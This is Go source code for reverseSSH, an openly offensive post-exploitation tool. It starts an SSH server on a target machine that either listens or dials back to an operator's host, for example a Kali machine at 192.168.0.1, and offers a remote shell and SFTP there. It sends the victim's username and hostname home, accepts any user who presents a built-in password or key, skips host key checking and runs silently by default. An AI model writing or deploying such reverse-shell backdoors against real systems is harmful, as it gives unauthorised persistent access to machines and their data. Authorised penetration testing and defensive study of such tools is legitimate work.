// reverseSSH - a lightweight ssh server with a reverse connection feature
// Copyright (C) 2021  Ferdinor <ferdinor@mailbox.org>

// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.

// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.

package main

import (
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net"
	"os"
	"os/user"
	"path"
	"strconv"
	"strings"
	"syscall"

	"github.com/gliderlabs/ssh"
	"github.com/pkg/sftp"
	gossh "golang.org/x/crypto/ssh"
	"golang.org/x/term"
)

type params struct {
	LUSER        string
	LHOST        string
	LPORT        uint
	homeBindPort uint
	listen       bool
	shell        string
	noShell      bool
	verbose      bool
}

func SFTPHandler(s ssh.Session) {
	server, err := sftp.NewServer(s)
	if err != nil {
		log.Printf("Sftp server init error: %s\n", err)
		return
	}

	log.Printf("New sftp connection from %s", s.RemoteAddr().String())
	if err := server.Serve(); err == io.EOF {
		server.Close()
		log.Println("Sftp connection closed by client")
	} else if err != nil {
		log.Println("Sftp server exited with error:", err)
	}
}

func dialHomeAndListen(username string, address string, homeBindPort uint, askForPassword bool) (net.Listener, error) {
	var (
		err    error
		client *gossh.Client
	)

	config := &gossh.ClientConfig{
		User: username,
		Auth: []gossh.AuthMethod{
			gossh.Password(localPassword),
		},
		HostKeyCallback: gossh.InsecureIgnoreHostKey(),
	}

	// Attempt to connect with localPassword initially and keep asking for password on failure
	for {
		client, err = gossh.Dial("tcp", address, config)
		if err == nil {
			break
		} else if strings.HasSuffix(err.Error(), "no supported methods remain") && askForPassword {
			fmt.Println("Enter password:")
			data, err := term.ReadPassword(int(syscall.Stdin))
			if err != nil {
				log.Println(err)
				continue
			}

			config.Auth = []gossh.AuthMethod{
				gossh.Password(string(data)),
			}
		} else {
			return nil, err
		}
	}

	ln, err := client.Listen("tcp", fmt.Sprintf("127.0.0.1:%d", homeBindPort))
	if err != nil {
		return nil, err
	}
	log.Printf("Success: listening at home on %s", ln.Addr().String())

	// Attempt to send extra info back home in the info message of an extra ssh channel
	sendExtraInfo(client, ln.Addr().String())

	return ln, nil
}

func sendExtraInfo(client *gossh.Client, listeningAddress string) {
	var currUser string
	if usr, err := user.Current(); err != nil {
		currUser = "ERROR"
	} else {
		currUser = usr.Username
	}
	host, err := os.Hostname()
	if err != nil {
		host = "ERROR"
	}
	info := fmt.Sprintf(
		"%s on %s reachable via %s",
		currUser,
		host,
		listeningAddress,
	)
	newChan, newReq, err := client.OpenChannel("rs-info", []byte(info))
	// The receiving end is expected to reject the channel, so "th4nkz" is a sign of success and we ignore it
	if err != nil && !strings.Contains(err.Error(), "th4nkz") {
		log.Printf("Could not create info channel: %+v", err)
	}
	// If the channel is actually accepted, just close it again
	if err == nil {
		go gossh.DiscardRequests(newReq)
		newChan.Close()
	}
}

func extraInfoHandler(srv *ssh.Server, conn *gossh.ServerConn, newChan gossh.NewChannel, ctx ssh.Context) {
	log.Printf(
		"New connection from %s: %s",
		conn.RemoteAddr(),
		string(newChan.ExtraData()),
	)
	newChan.Reject(gossh.Prohibited, "th4nkz")
}

func setupParameters() *params {
	var help = fmt.Sprintf(`reverseSSH v%[2]s  Copyright (C) 2021  Ferdinor <ferdinor@mailbox.org>

Usage: %[1]s [options] [[<user>@]<target>]

Examples:
  Bind:
	%[1]s -l
	%[1]s -v -l -p 4444
  Reverse:
	%[1]s 192.168.0.1
	%[1]s kali@192.168.0.1
	%[1]s -p 31337 192.168.0.1
	%[1]s -v -b 0 kali@192.168.0.2

Options:
	-l, Start reverseSSH in listening mode (overrides reverse scenario)
	-p, Port at which reverseSSH is listening for incoming ssh connections (bind scenario)
		or where it tries to establish a ssh connection (reverse scenario) (default: %[6]s)
	-b, Reverse scenario only: bind to this port after dialling home (default: %[7]s)
	-s, Shell to spawn for incoming connections, e.g. /bin/bash; (default: %[5]s)
		for windows this can only be used to give a path to 'ssh-shellhost.exe' to
		enhance pre-Windows10 shells (e.g. '-s ssh-shellhost.exe' if in same directory)
	-N, Deny all incoming shell/exec/subsystem and local port forwarding requests
		(if only remote port forwarding is needed, e.g. when catching reverse connections)
	-v, Emit log output

<target>
	Optional target which enables the reverse scenario. Can be prepended with
	<user>@ to authenticate as a different user other than 'reverse' while dialling home

Credentials:
	Accepting all incoming connections from any user with either of the following:
	 * Password "%[3]s"
	 * PubKey   "%[4]s"
`, path.Base(os.Args[0]), version, localPassword, authorizedKey, defaultShell, LPORT, BPORT)

	flag.Usage = func() {
		fmt.Print(help)
		os.Exit(1)
	}

	p := params{}

	lport, err := strconv.ParseUint(LPORT, 10, 32)
	if err != nil {
		log.Fatal("Cannot convert LPORT: ", err)
	}
	homeBindPort, err := strconv.ParseUint(BPORT, 10, 32)
	if err != nil {
		log.Fatal("Cannot convert BPORT: ", err)
	}
	flag.UintVar(&p.LPORT, "p", uint(lport), "")
	flag.UintVar(&p.homeBindPort, "b", uint(homeBindPort), "")
	flag.BoolVar(&p.listen, "l", false, "")
	flag.StringVar(&p.shell, "s", defaultShell, "")
	flag.BoolVar(&p.noShell, "N", false, "")
	flag.BoolVar(&p.verbose, "v", false, "")
	flag.Parse()

	if !p.verbose {
		log.SetOutput(ioutil.Discard)
	}

	switch len(flag.Args()) {
	case 0:
		p.LUSER = LUSER
		p.LHOST = LHOST
	case 1:
		target := strings.Split(flag.Args()[0], "@")
		switch len(target) {
		case 1:
			p.LUSER = LUSER
			p.LHOST = target[0]
		case 2:
			p.LUSER = target[0]
			p.LHOST = target[1]
		default:
			log.Fatalf("Could not parse '%s'", target)
		}

	default:
		log.Println("Invalid arguments, check usage!")
		os.Exit(1)
	}

	return &p
}

func run(p *params, server ssh.Server) {
	var (
		ln  net.Listener
		err error
	)

	if p.listen || p.LHOST == "" {
		log.Printf("Starting ssh server on :%d", p.LPORT)
		ln, err = net.Listen("tcp", fmt.Sprintf(":%d", p.LPORT))
		if err == nil {
			log.Printf("Success: listening on %s", ln.Addr().String())
		}
	} else {
		target := net.JoinHostPort(p.LHOST, fmt.Sprintf("%d", p.LPORT))
		log.Printf("Dialling home via ssh to %s", target)
		ln, err = dialHomeAndListen(p.LUSER, target, p.homeBindPort, p.verbose)
	}

	if err != nil {
		log.Fatal(err)
	}
	defer ln.Close()
	log.Fatal(server.Serve(ln))
}
